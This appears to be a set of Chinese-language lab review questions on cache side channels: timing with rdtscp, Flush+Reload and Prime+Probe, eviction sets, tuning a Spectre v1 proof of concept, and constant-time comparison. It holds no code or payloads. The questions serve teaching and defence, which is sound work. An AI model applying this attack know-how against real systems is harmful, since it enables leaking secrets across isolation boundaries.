1. **任務一**：如果不關 prefetcher，MISS 的 cycle 數會怎麼變化？為什麼 hardware prefetcher 會讓 MISS 變快（而不是更慢）？

2. **任務一**：`rdtscp` 和 `rdtsc` 的差別是什麼？為什麼量測 cache timing 不能用 `rdtsc`？（提示：out-of-order execution）

3. **任務二**：F+R 需要攻擊者和受害者**共享記憶體**（或同一物理頁）。P+P 不需要。解釋 P+P 是如何在沒有共享記憶體的情況下偵測受害者的 cache 活動的。

4. **任務二**：i7-10700 L3 的 eviction set 需要幾條 cache line？如果攻擊者不知道 L3 associativity，有什麼方法可以從實驗中推算出來？

5. **任務三**：Kocher bitmask trick 的目的是什麼？為什麼不直接用 `if (round % 6 == 0)` 決定是否送 OOB 索引？（提示：branch predictor 的訓練來源）

6. **任務三**：noise filter 排除 indices 0..16 的理由是什麼？如果 secret 的真實值恰好是 ASCII 0–16 的其中一個，這個 filter 會讓攻擊失敗嗎？該怎麼處理？

7. **任務四**：constant-time 的「time」指的是執行時間與輸入無關。但 `ct_compare` 裡的 `volatile` 是必要的嗎？如果移除 `volatile`，gcc -O2 可能做什麼優化，使函式不再是 CT 的？

8. **任務五**：你的機器顯示 `spectre_v1: Mitigation: usercopy/swapgs barriers and __user pointer sanitization`，但任務三的 PoC 仍然成功。這是矛盾的嗎？解釋這個緩解措施保護的是什麼路徑，而你的 PoC 利用的是什麼路徑。
